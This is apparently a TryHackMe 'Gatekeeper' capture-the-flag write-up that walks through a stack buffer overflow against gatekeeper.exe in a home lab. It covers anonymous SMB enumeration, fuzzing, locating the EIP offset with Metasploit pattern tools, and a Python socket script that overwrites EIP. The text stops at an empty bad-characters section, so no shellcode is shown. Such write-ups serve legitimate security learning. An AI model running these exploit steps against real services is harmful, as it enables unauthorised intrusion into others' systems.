

---

### Deploy Machine and Scan Network

- ![image](https://user-images.githubusercontent.com/94720207/169636811-a9a34ab5-9d7f-42ec-a883-627f1ad94948.png))

- ![image](https://user-images.githubusercontent.com/94720207/169636037-e216bbad-391c-496c-b461-0e2d65dc1b94.png)

- ![image](https://user-images.githubusercontent.com/94720207/169636850-2f3d5382-d440-4761-9dc2-d9acc64dc4d2.png)

- ![image](https://user-images.githubusercontent.com/94720207/169636867-93df1b45-60a1-45d5-85ce-7dd9eb2aac5c.png)


---

### Services Enumeration

- `smbclient -N -L \\\\$ip_target\\`

- ![image](https://user-images.githubusercontent.com/94720207/169636978-f9fc5e1c-08a2-4e13-a051-7b259bcf8ff4.png)

    - **"Users" share is available for login without password, let's sniff inside.**

- `smbclient -N -L \\\\$ip_target\\Users`

    - I've found the executable `gatekeeper.exe` I will download it and prepare the `Buffer Overflow Lab` in my own bare metal Windows 10. 

- ![image](https://user-images.githubusercontent.com/94720207/169637348-142c6a3f-de24-4c58-8bee-b1c7c6046552.png)

---

### Lab Setup:

- I will use the same setup for `Vuln Server` Lab:
        
    - Using Windows 10 Pro on a bare metal CPU
        - `gatekeeper.exe` running here
        - `Immunity Debugger` + `mona` running here
                
    - Using Kali Linux in a VMware Pro VM
        - `python` scripts and tricky tricks running here
            
    - Both machines connected on the same Network 192.168.1.0/24 (My local Network)
            
    - Once I've exploited the program `gatekeeper.exe` in my own machine, then I can exploit "the real" server with the final script:
            
        - `TryHackMe - Gatekeeper` Network, UK.    
        
    - So I will transfer the files from the TryHackMe Machine-FTP to a folder to my Windows 10 and use from there `Immunity Debugger` and also run the `chatserver.exe` binary.
        
        - ![image](https://user-images.githubusercontent.com/94720207/169637748-1ae93fc6-73a3-4e21-88ae-14f3e833c142.png)
          
    - Easy! Let's do it! 

---

### Buffer Overflow

- I will use the same steps used in `Vuln Server` lab... this steps work with allmost all the buffer overflow procedures:

- **Steps to conduct a buffer overflow:**

    1. _Spiking - Method to find vuln part of the program_ Not necessary in this Lab
    2. Fuzzing - Send a bunch of characters and see if we can break it
    4. Finding the Offset - At what point did we break it
    5. Overwriting the EIP - Overwriting the Poiting Address and control it
    6. Finding Bad Characters - ...
    7. Finding the Right Module - ...
    8. Generating Shellcode - Once we know the bad characters and right module we can generate a shellcode
    9. Root!

---

### Fuzzing

- First of all, I will run `gatekeeper.exe` as administrator and then start `Immunity Debugger` and attach the program. 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169637970-252158e3-9967-41e1-a6ac-587a548bde3f.png)

    - ![image](https://user-images.githubusercontent.com/94720207/169637996-c25fa35e-bcd9-4026-b12b-110bc8870e04.png)

- Then, I will run the Immunity Debugger with "play".

    - ![image](https://user-images.githubusercontent.com/94720207/169638036-2ab7bd99-0fea-484a-af2f-7c2e09a96df6.png)

        - Running and ready to go!

- On Kali Linux:

    1. Connect to `gatekeeper.exe`:
        
        - Using the IP Address of the Windows Machine **192.168.10.100** + gatekeeper.exe Port **31337** (We've seen that port on `nmap` typing "help, help, help")
            
        - ![image](https://user-images.githubusercontent.com/94720207/169188519-02fab4e5-91e4-4272-a788-9239ad878c4a.png)
           
        - On Kali: `nc -nv 192.168.1.100 31337`
            
        - ![image](https://user-images.githubusercontent.com/94720207/169638159-af1130de-075d-47b0-b6ab-a43b1ca45838.png)
 
 - **It looks that this program `Gatekeeper` take commands based on what you type AKA `strings` to generate an `answer` with the instruction `Hello ("%variable%")!!!`**
  
     - This means, maybe the buffer overflow and/or the pointer of `EIP` that we need to exploit is located there, maybe I need to send 100 bytes of characters, maybe 3000...who knows!?
     
     - So, **we will do our `fuzzing` process to know how many bytes (characters) do we need to crash the program `gatekeeper.exe`**
     
- **As difference with `Vuln Server` Lab, here we are NOT using commands, just a string to make the `gatekeeper server` respond with a `string`**

    - **So, instead of using **`generic_send_tcp`** technique and spiking the strings, I will write a simple python script doing the following large strings and "jump" the spiking process, I really don't care very much being so precise with the breaking point at this moment, so I will only spam thousands of bytes and see what happen.**
    
```python
#!/usr/bin/python

print "A" * 5000
```

- Or just using a python command:

    - `python -c 'print "A" * 5000'` 

- With this simple script we will generate 5000 bytes of "A's" at once:

    - ![image](https://user-images.githubusercontent.com/94720207/169638415-43d37e2b-079b-4bd0-a8e2-e96c3a00c6dd.png)

- And we will copy and paste it to the program, it's just like a basic "manual fuzzing" and then press `enter`:

    - ![image](https://user-images.githubusercontent.com/94720207/169638479-071a4226-18aa-4c60-8247-eeef445f0750.png)

- BOOM!!! We did it!!! The `chatserver.exe` have just crashed, it means the `buffer space` of "message" is not sanitized and we can exploit it. 

    - ![image](https://user-images.githubusercontent.com/94720207/169638574-63ddd521-886b-4327-a82b-c0bfdff6feb1.png)

- Bota fixa papai!

    - If we look at `EBP` we can see `41414141`: THAT'S THE HEX CODE FOR: `AAAA`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169456928-65563691-936f-441c-9ade-edf2f7c31752.png) 

    - Also, we went over `ESP` with a bunch of "A"

    - Finally, we get into `EIP` too with `41414141`: THA'TS THE HEX CODE FOR: `AAAA`

- Remember: **The `EIP` is the important factor!**

    - If we control `EIP` we can point somethin malicious! But for that, we need to locate "where's `EIP` now?"

- NOTE: The program has crashed, so we will need to restart the `Gatekeeper Server` and attach it again to the `Immunity Debugger`

    - **It's better to close everything and start from 0 to avoid errors** 

- We already know that the program `Gatekeeper Server` can crash somewhere if we send a string overflow of 5000 bytes (A's)

- **As difference with `vuln server` we did this process a lot quickier, that's because in this scenario we did not needed `spiking` adn threw random 5000 bytes at once, maybe not so much precise as `spiking` but it's fasterr.**

    - **With just a bunch of "A's" we did realize that the string can crash the program, that means now we need to `find the offset`
    
- we just need to know aprox where we crashed the program, and we know is somewhere around **less than 5000 bytes**

    - Now, that we know that the crash is somewhere less 5000 bytes, we need to know: **where's the `EIP` value at?**

    - Remember, controlling the `EIP` is the puprose of all of this attack. 

---  

### Finding the Offset

- First of all, restart everything because the last crash...

- We are going to be looking for where the overwirte the `EIP`: 

    - Because controlling EIP means control the shellcode of the program (so we can send malicious scripts like a reverse shell).
    
- **For this step, we will use the tool `pattern_create` by Metasploit:**

- ![image](https://user-images.githubusercontent.com/94720207/169657801-7163e03f-ad5e-4de0-accc-f963221b781b.png)
 
    - In Kali machine (-l is for lenght):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169460983-5457be7f-4a12-4f88-b31d-1d11a6a07153.png)
 
        - Now, instead of sending a bunch of `A`'s we will send the "crazy code", or better said, the pattern algorythm to find the offset.
        
            - **Note: Again, the difference with `vuln server` is that we don't need a string before or something else, se just copy and paste the pattern just like we did with the A's**
            
        - ![image](https://user-images.githubusercontent.com/94720207/169657959-c9040268-2d11-4088-9bcb-1c85ae828abe.png)
        
            - We crashed the `gatekeeper.exe` again, this time with the pattern:
            
        - ![image](https://user-images.githubusercontent.com/94720207/169658066-3761e84e-fbe0-4f81-90e5-1e258f7cf214.png)
 
 - When we send that crazy string we going to get the value on the `EIP` like magic, but how it works?

    1. We send the "crazy code" and we know that in some point it will crash (because it have 5000 bytes and we know it crashes at some point).
    
        - **That "crazy code" is actually a pattern alogythm of characters, so Metasploit can identify the bytes where the crash exactly happened! booom!!!**
    
    3. After the crash, we going to say to Metasppoit:
    
        - **The program have crashed with the `pattern_create`, identify exactly where it crashed, plz! :3.**    

    - Just like in fuzzing: We sent _"TRUN /.:/ Cr4zyCodeCr4zyCodeCodeCr4zyCode..."_ (instead of A's) and matched "the perfect world"
    - We also overwrite `ESP`, `EBP` and `EIP`.
    - It's very similar to the A's, **but in this case we used the Metasploit character `pattern_creator` AKA "the crazy code"**
    
        - NOTE: We can know that we passed by far the crash zone (just like with A's) because we can see a large string on ESP-
        - Remember!: 
        
            1. The perfect world is the large string in `EAX`
            2. Any other large string means that we overwrite that register (`ESP`) by a looooot of chars 
            3. But, the important thing here is that we overwrite `EIP`
        
                - ![image](https://user-images.githubusercontent.com/94720207/169658161-98e52e8c-8083-49af-98da-ba77092e8d56.png)
       
            - **The important and critic value here then is the `EIP`:**
            
                - **`39654138`** 
                            
            - Let's use this value to abuse the vulnerability!

- This step is similar to the last one, but instead of using `pattern_create` tool, we will use `pattern_offset`:

- ![image](https://user-images.githubusercontent.com/94720207/169327203-1bd951d1-a149-4e20-ba65-cecb5cad7020.png)

    - In Kali machine (-l is for lenght), (-q is for query, our finding of the exact **pattern**):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50000 -q 39654138`
   
    - After we press "enter", we should find a **pattern offset**:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169658272-bd4dbdcc-d60d-432d-a619-5aa86f752195.png)
        
            - **NOTE: We have 3 different exact matches this time (in vuln server or brainstorm there was only 1 at more than `2000` bytes), this is because the real offset is very close to the beginning `146` bytes, this means that 5000 bytes for fuzzing were too much! I needed just 200 to test maybe...**
            
            - **That's why spiking is used!!! With spiking before fuzzing I would know that the offset would be near from 200 maybe, but I've decided to trhow randomly 5000 chars at once. 
            
            - That's why I used 5000 bytes again in this lab, so spiking is now clear! :D**  
        
            - **This information is critical, because this means that exactly at `146 bytes`, we can control `EIP` overwriting it**

---

### Overwriting the EIP

- We know that the offset for make the program crash and point exactly to the `EIP` is at `146 bytes`.

    - **That means, `146 bytes` just before to get to the `EIP`**
    
    - **The `EIP` itself is `4 bytes` long** 
    
- So, we going to overwrite this specific `4 bytes` just after we fill those `146` bytes ;)  

    - **I will use the next python script for the whole Lab, so I will comment line by line _(Script without comment below)_**
    
    - This will be saved as `1_fz3r0_gatekeeper.py`  

```python
    # We declare we are using python:
    
#!/usr/bin/python

    # Import Socket is used to make the connection OUT (script[kali] >> target[windows chatserver.exe])
    # Very similar to netcat
    
import socket

    # Sys Module allows operating on the interpreter as it provides access to the variables and functions that interact strongly with the interpreter.
    # For example: "print(sys.version)" will bring something like "id" linux bash command.

import sys

        # * - The "gatekeeper.exe" prompt for any string (vulverable to buffer overflow!!!)
        #     variable |---> gate_string
    
        # =-=-=-=-=-=-=-=-= The variable "gate_string" contains the next trick! =-=-=-=-=-=-=-=-=-=-=
    
        # "A" * 146    ---> I'll send 146 bytes (A's) each time
        #                    Remember, 146 bytes is exactly the offset we use to make the system crash and point to the starting byte of EIP!!!
        
        # "B" * 4       ---> We are using "B" to identify the EIP, because "A" will reach to the "perfect world" buffer, then "B" will overwrite just the EIP spot! 

        # "b"           ---> "b" is used before the string to send the string as Bytes and no as String
        
gate_string = b"A" * 146 + b"B" * 4

    # The script will start with "try"
    # "Try to insert 146 bytes of A's, followed by 4 bytes of B's" 

try:
        
            # Print message to console:
        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
        
            # I'll use the socket module to create the variable "s"
            # This is a very standard usage of the module socket to get IPv4:PORT = Socket
            # We will define out RHOST & RPORT (Target/Windows 10 > gatekeeper.exe)
        
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',31337))
        
            # Once it connects with the RHOST, the script will only prompt for any string. (Not like other labs with more interactive actions recievend data, that's why I will comment the s.recv option) recieve "intro" Data back from it (The welcome message and that stuff...)
            
        # s.recv(1024)

            # Once it connects with the RHOST, the program start to prompt for data.
            # I will use the Socket Module and variable "s" to send data to the "gatekeeper.exe"
                
                # "gatekeeper.exe" prompt for a << gate_string >> (vulverable to buffer overflow!!!)
                    
                    # send      = "send this"
                    # gate_string   = "b"A" * 146 + b"B" * 4" (++++ tricky payload ++++)
                    # '\r\n\'   = \return \new line (like pressing "enter")
                    # b         = "b" is used before the string to send the string as Bytes and no as String"

        s.send(gate_string + b'\r\n')
              
            # Close connection with RHOST and end.
       
        s.close()

    # Exception script in case some error happen, return a message and exit. 

except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Don't ask me, I'm just a script!!! >.<")
        sys.exit()
```

- **No comment version:**

```python   
#!/usr/bin/python
    
import socket
import sys
        
gate_string = b"A" * 146 + b"B" * 4

try:            
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',31337))
        s.send(gate_string + b'\r\n')
        s.close()

except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Don't ask me, I'm just a script!!! >.<")
        sys.exit()
```

- `chmod +x` to the script to make it executable:

    - ![image](https://user-images.githubusercontent.com/94720207/169660625-1ed3c045-9a8e-4bcc-badf-e99ef17a335b.png)

- Check that `chatserver.exe` and `immunity debugger` are running (otherwise restart) and...

    - Execute it! Que chille!!! 

        - **`python3 1_fz3r0_gatekeeper.py`**  

    - ![image](https://user-images.githubusercontent.com/94720207/169660788-df5eec00-3491-4249-9f76-7f3c982e1d88.png)

        - Note: Close it with Ctrl+C to end script if needed
        
    - The program crashes, that's perfect! let's see `Immunity Debugger`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169660871-61f0051d-664f-4cde-8600-33d371a707b2.png)

     - And this is how it looks our precious `BBBB` or `42424242`
            
    - **We succesfully overwritten the `EIP` and we have control of it**, but just with an inocent "BBBB" (4 bytes)...
    
        - **It's time to overwirte it with some malicious shellcode containung a 4 bytes of deadly poison!**  

---

### Finding Bad Characters






---

### References

https://github.com/hamza07-w/gatekeeper-tryHackme-writeup